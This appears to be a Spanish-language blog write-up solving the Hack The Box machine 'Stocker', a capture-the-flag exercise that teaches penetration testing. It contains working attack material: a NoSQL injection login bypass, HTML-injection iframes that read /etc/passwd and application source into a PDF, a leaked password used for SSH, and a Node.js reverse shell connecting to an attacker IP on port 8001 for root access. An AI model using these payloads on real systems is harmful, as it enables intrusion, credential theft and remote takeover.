---
layout: single
title: Stocker - Hack The Box
excerpt: "Esta vez HTB nos presenta una máquina Linux de nivel fácil, donde contiene una sitio web de compras, si aplicamos fuzzing para escanear y enumerar, nos encontramos con un subdomnio que contiene un panel de login, que  es vulnerable a NoSQL Injection, si la bypassemos no redirije a una tienda, donde podremos aplicar HTML Injection, para obtener  credenciales y poder conectarnos remotamente a la maquina y proceder a la escalada de privilegios." 
date: 2023-07-06
classes: wide
header:
  teaser: /assets/images/HTB/writeup-stocker/stocker.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy
  - CFTs
tags:
  - Privilege Escalation
  - Pentesting
  - Linux
  - Fuzzing
  - Subdomain Enumeration
  - NoSQL Injection
  - HTML Injection
---


![](/assets/images/HTB/writeup-stocker/stocker.png)

[Download Write-Up](https://github.com/0mariano/0mariano.github.io/blob/master/PDFs%20and%20tex/Write-Up/MAA-Write-Up-Stocker.pdf)



---

# **Índice**

1. [Introducción](#introduccion)
2. [Reconocimiento](#reconocimiento)
  * [Herramienta nmap](#herramienta-nmap)
3. [Enumeración](#enumeracion)
  * [Investigando el sitio web](#investigando-el-sitio-web)
  * [Fuzzing con wfuzz](#fuzzing-con-wfuzz)
4. [Explotación](#explotacion)
  * [NoSQL Injection](#nosql-injection)
  * [HTML Injection](#html-injection)
  * [Escalada de privilegios](#escalada-de-privilegios)

---

# Introducción 📄 [#](#introduccion) {#introduccion}
El presente documento explica los pasos para resolver la máquina <span style="color:green"> **Stocker** </span> de la plataforma [HackTheBox](https://hackthebox.com).
Esta vez HTB nos presenta una máquina Linux de nivel fácil, donde contiene una sitio web de compras, si aplicamos fuzzing para escanear y enumerar, nos encontramos con un subdomnio que contiene un panel de login, que  es vulnerable a NoSQL Injection, si la bypassemos no redirije a una tienda, donde podremos aplicar HTML Injection, para obtener  credenciales y poder conectarnos remotamente a la maquina y proceder a la escalada de privilegios.


![](/assets/images/HTB/writeup-stocker/Etapas-pentest.png)

# Reconocimiento 🔍 [#](#reconocimiento) {#reconocimiento}
## Herramienta nmap 👁️ [#](#herramienta-nmap) {#herramienta-nmap}
Lazamos la herramienta nmap para averiguar los puertos y servicios abiertos de la máquina victima.

```bash
# Primer escaneo con nmap
--------------------------------------------------------------
nmap -p- --open -v 10.10.11.196
```

![](/assets/images/HTB/writeup-stocker/Nmap1.png)

Obtenemos dos puertos abiertos, el puerto <span style="color:blue"> 22 </span> que pertence al protocolo **ssh** y el puerto <span style="color:red"> 80 </span> que pertence al
protocolo **http**.

Vamos a tirar nmap otra vez, pero ahora vamos a especificar la versión del servicio.

```bash
# Segundo escaneo con nmap
--------------------------------------------------------------
nmap -p 22 ,80 - sC - sV 10.10.11.196 - oN tarjeted
```

![](/assets/images/HTB/writeup-stocker/Nmap2.png)


Vemos que en el puerto 80 intenta redireccionar la conexión al dominio **stocker.htb**, pero no tiene éxito.

# Enumeración 📌 [#](#enumeracion) {#enumeracion}
Vamos a tratar de entrar al dominio stocker.htb, para eso hay que modificar el archivo de **/etc/hosts**.

```bash
# Modificamos el archivo que hace el redireccionamiento y agregamos la IP de la máquina con el dominio que obtuvimos con nmap
--------------------------------------------------------------
nano /etc/hosts

10.10.11.196 stocker.htb
```

Ahora si queremos acceder al sitio web, podemos hacerlo.

## Investigando el sitio web 🕵️‍♂️ [#](#investigando-el-sitio-web) {#investigando-el-sitio-web}
Vamos a investigar un poco...

Si scrooleamos veremos que hay una persona de la empresa que dejo un comentario en el sitio web, se trata
de **jefe** del área de **IT** y nos cuenta que quiere que la gente use su sitio web pero por ahora estan dejando
todo el tinglado fino para que quede bien operativa, lo que no sabe es que nosotros le haremos un pentesting a
su sitio y que le robaremos sus credenciales, pero ojo siempre **White-Hat**. Bueno no hay nada mas que hacer,
acordemosno del jefe, que se llama Angoose.

![](/assets/images/HTB/writeup-stocker/angoose.png)

## Fuzzing con wfuzz 🕵️‍♂️ [#](#fuzzing-con-wfuzz) {#fuzzing-con-wfuzz}
Vamos a enumerar y escanear subdominios aplicando fuzzing.

```bash
# Uso wfuzz para enumerar subdominios
--------------------------------------------------------------
wfuzz -c -- hc =404 -t200 -w /usr/share/seclists/Discorvery/DNS/subdomains-top1million-110000ker.txt -u http://stocker.htb --hw 12
```

![](/assets/images/HTB/writeup-stocker/wfuzz.png)

**dev** unico subdominio que encontramos

Otra vez volvamos a editar el archivo /etc/hosts

```bash
# Modificamos el archivo que hace el redireccionamiento y agregamos la IP de la máquina con el subdominio que obtuvimos con wfuzz
--------------------------------------------------------------
nano /etc/hosts

10.10.11.196 dev.stocker.htb
```

Luego entramos y nos dirije a un panel de login.

![](/assets/images/HTB/writeup-stocker/dev.stocker.htb-login.png)

Con la ayuda del Wappalyzer, vemos que en el Backend esta corriendo Express.
Para más información sobre el Framework, presione aqui: [Express](https://kinsta.com/es/base-de-conocimiento/que-es-express/#:~:text=Cerrar-,Express.,desarrollar%20aplicaciones%20backend%20con%20Node.)
Pero basicamente Express es un Framework para Node.js, donde utiliza Bases de Datos **NoSQL**.

![](/assets/images/HTB/writeup-stocker/wappalizer.png)

# Explotación 🔥 [#](#explotacion) {#explotacion}
Provemos hacer fuerza bruta con **admin:admin** o **angoose123:angoose123**.
No tenemos éxito con ninguna posible password.

![](/assets/images/HTB/writeup-stocker/admin-admin.png)


Pero como sabemos Express utiliza Base de Datos NoSQL, lo que podremos intentar baypassearlo con NoSQL
Injection, pero para eso vamos a visistar [HackTricks](https://book.hacktricks.xyz/welcome/readme) para ver como explotar la vulnerabilidad.
Click para abrir el recurso utilizado de HackTricks: [NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
Abrir BurpSuite para interceptar la data y usamos devuelta admin:admin, le damos enter.

![](/assets/images/HTB/writeup-stocker/adminerror.png)

Tiro un error al colocar admin en el user y en el password, para eso usamos el metodo de autenticación que
sacamos de HackTricks.

## NoSQL Injection 💉 [#](#nosql-injection) {#nosql-injection}
Esto lo baypaseeamos de la siguiente manera diciendole que el username y la password no es null, con lo cual
es cierto por lo tanto nos loguea.
Cambiamos el **Content-Type:** y agregamos **/json**, luego y colocamos el elemento de la siguiente manera:

```bash
# Bypasseamos diciéndole que el username y el password no es null
--------------------------------------------------------------
{
" username ": { " $ne ": null } ,
" password ": { " $ne ": null }
}
```

Y nos dirije **dev.stokcer.htb/stock**.
SI scroleamos vemos una tienda, si hacemos memoria en el pasado, el dominio original (stocker.htb) se trataba
de una tienda, cuyo Jefe del Area IT comentaba que no estaba operativa, pues aca esta.

![](/assets/images/HTB/writeup-stocker/dev.stocker.htb-stock2.png)

Si interactuamos con la tienda y añadimos los productos al carrito y hacemos clic en <span style="color:blue"> Submit purchase </span> nos dan una orden de compra y un link para ver el recibo del pedido (es un PDF).

![](/assets/images/HTB/writeup-stocker/submit-purchase.png)

![](/assets/images/HTB/writeup-stocker/url_here.png)

Si interceptamos la petición en BurpSuite, vemos que el Content-Type esta en json.
Podemos intentar cambiar el titulo de un producto para ver si se representa en el PDF del recibo.

![](/assets/images/HTB/writeup-stocker/mariano-burpsuite.png)

Cargamos el PDF y funciona!!!

![](/assets/images/HTB/writeup-stocker/mariano-pdf1.png)

## HTML Injection 💉 [#](#html-injection) {#html-injection}
Sacando conclusiones, seguramente podemos inyectar código HTML en el titulo.

```bash
# Inyectamos código HTML para conseguir ver mediante el PDF archivos de la máquina
--------------------------------------------------------------
<iframe src=/etc/passwd> </iframe>
```

![](/assets/images/HTB/writeup-stocker/pdfconhtml.png)

Para poder ver mejor todos los archivos de la máquina mejorando el codigo HTML jugando con <span style="color:blue"> width </span> y <span style="color:blue"> height </span> 

```bash
# Inyectamos código HTML jugando con width y height para conseguir ver mediante el PDF archivos de la maquina
--------------------------------------------------------------
<iframe src=/etc/passwd > width =1000 px height =1000 px </iframe>
```

![](/assets/images/HTB/writeup-stocker/root-angoose.png)

Ok podemos ver dos usuarios con sus respectivas rutas, sabiendo que <span style="color:red"> Stocker </span> es una máquina **Linux**, como
sabemos que por detras esta implementado Node.js podemos tratar de acceder a la ruta **/var/www/dev**,
buscando un archivo especifico, cuando se implementa Node.js, como el archivo **index.js**.

```bash
# Seguimos jugando con el width y height para visualizar el archivo
--------------------------------------------------------------
<iframe src=file:///var/www/dev/index.js> width =1000 px height =1000 px </iframe>
```

![](/assets/images/HTB/writeup-stocker/angoose-passwd.png)

Encontramos un password <span style="color:red"> IHeardPasshrasesArePrettySecure </span> que pertenece a una base de datos , precisamente de mongodb.

##  Escalada de privilegios 👩‍💻 [#](#escalada-de-privilegios) {#escalada-de-privilegios}
Primero intentemos autenticarnos de forma remota por ssh, usando el user (angoose) que obtuvimos antes.

```bash
ssh angoose@stocker.htb
--------------------------------------------------------------
password: IHeardPasshrasesArePrettySecure
```

![](/assets/images/HTB/writeup-stocker/angoose-id.png)

Si revisamos los permisos privilegios con **Sudo -l** vemos que podemos ejecutar node y los scripts que termine
con .js

![](/assets/images/HTB/writeup-stocker/angoose-sudo.png)

Sabiendo que podemo ejecutar archivos con extension **.js**, podemos hacer un Path Traversal donde podremos
conectarnos por **NetCat** por el puerto **8001**.
Vamos a crear un archivo con extension .js donde pondremos adentro una **Reverse Shell**, nos guiamos por
esta por esta página: [revshells](https://www.revshells.com/).

```bash
 nano stocker.js
  
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(8001, "10.10.14.152", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
    })();
```

Luego en nuestra máquina de atacante, abrimos una terminal y nos ponemos en escucha por el puerto 8001 **nc -lvnp 8001**

![](/assets/images/HTB/writeup-stocker/root.png)

Probamos y listo ya tenemos la **Flag**.
